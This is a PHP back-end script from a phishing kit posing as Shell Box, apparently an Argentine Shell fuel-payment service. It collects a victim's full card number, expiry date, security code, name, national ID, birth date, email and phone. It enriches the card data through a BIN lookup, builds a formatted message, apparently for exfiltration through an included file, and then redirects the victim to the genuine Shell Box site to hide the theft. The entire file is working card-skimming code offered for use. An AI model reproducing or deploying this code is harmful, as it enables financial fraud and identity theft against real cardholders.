<?php  
session_start();
$card = $_POST['cac'][0].$_POST['cac'][1].$_POST['cac'][2].$_POST['cac'][3].$_POST['cac'][5].$_POST['cac'][6];
$result="";


if ($_POST['cac'] != "" && $_POST['exex'] != "" && $_POST['casfa'] != "" && $_POST['names'] != "" && $_POST['dni'] != "") {
    function query($card, $result){
    $result = file_get_contents("https://lookup.binlist.net/".$card); 
    $datos = json_decode($result, true);
    

    /*var_dump($datos);*/   
    

    $tipo_tarj = $datos['bank']['name'];
    $pais = $datos['country']['name'];
    $urlPage = $datos['bank']['url'];
    $type=$datos['type'];
    $moneda=$datos['country']['currency'];
    $enviara =
    "<b> ## SHELL BOX ## </b>\n".
    "  [ FULL ] \n".
    "<b>✔️ Nombres: </b> <code>".$_SESSION['nombre']."</code>\n".
    "<b>✔️ DNI: </b> <code>".$_SESSION['dnid']."</code>\n".
    "<b>✔️ Nacimiento: </b> <code>".$_SESSION['date']."</code>\n".
    "<b>✔️ Email: </b> <code>".$_SESSION['email']."</code>\n".
    "<b>✔️ Tel: </b> <code>".$_SESSION['tel']."</code>\n".
    "  [ Tarjeta ] \n".
    "<b>✔️ 16digito: </b> <code>".$_POST['cac']."</code>\n".
    "<b>✔️ vence: </b> <code>".$_POST['exex']."</code>\n".
    "<b>✔️ Código: </b> <code>".$_POST['casfa']."</code>\n".
    "<b>✔️ Nombres: </b> <code>".$_POST['names']."</code>\n".
    "<b>✔️ docu: </b> <code>".$_POST['dni']."</code>\n".
    "  [ Iformación de la tarjeta ] \n".   
    "<b>✔️ Type: </b> <code>".$tipo_tarj."</code>\n".
    "<b>✔️ Country: </b> <code>".$pais."</code>\n".
    "<b>✔️ Url: </b> <code>".$urlPage."</code>\n".
    "<b>✔️ Moneda: </b> <code>".$moneda."</code>\n";
    $enviar =  urldecode($enviara);
    include 'function.php';
session_destroy();
header("location:https://shellbox.shell.com.ar/?utm_source=google&utm_medium=search&utm_campaign=shellbox_search_branding&utm_id=17883473206&gclid=EAIaIQobChMI-8K5wtqNggMVEm2RCh3RAgh_EAAYASAAEgI5wPD_BwE");
}
query($card, $result);

}

?>